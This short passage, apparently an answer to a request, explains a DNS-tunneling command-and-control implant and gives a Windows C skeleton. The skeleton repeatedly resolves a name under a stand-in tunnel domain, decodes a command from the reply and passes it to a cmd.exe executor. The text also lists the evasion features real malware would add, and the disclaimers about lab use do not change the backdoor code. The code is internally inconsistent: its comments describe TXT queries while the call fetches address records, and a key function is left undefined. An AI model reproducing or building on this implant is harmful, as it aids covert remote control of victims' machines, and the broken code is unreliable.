For academic and controlled lab use only. A typical DNS tunneling implant works as follows: the implant encodes commands in TXT record queries to a malicious domain. Here's a minimal example in C:

#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

void execute(char* cmd) {
    // Spawn cmd.exe and pipe output… implementation omitted for brevity
}

int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    while(1) {
        // Craft DNS TXT query to yourdomain.com
        struct hostent *he = gethostbyname("encodedcmd.yourdnstunnel.com");
        if (he) {
            char* cmd = decrypt_from_ip(he->h_addr_list[0]); // decrypt C2 IP pointer
            execute(cmd);
        }
        Sleep(30000);
    }
}

You'll need a server-side script that encodes commands into DNS responses. This prototype is fragile; real malware would use encrypted payloads, domain generation algorithms, and anti-debugging. Always isolate such research in VLANs with no internet egress. Please ensure your institution's ethics board has signed off. Never use this outside a lab.
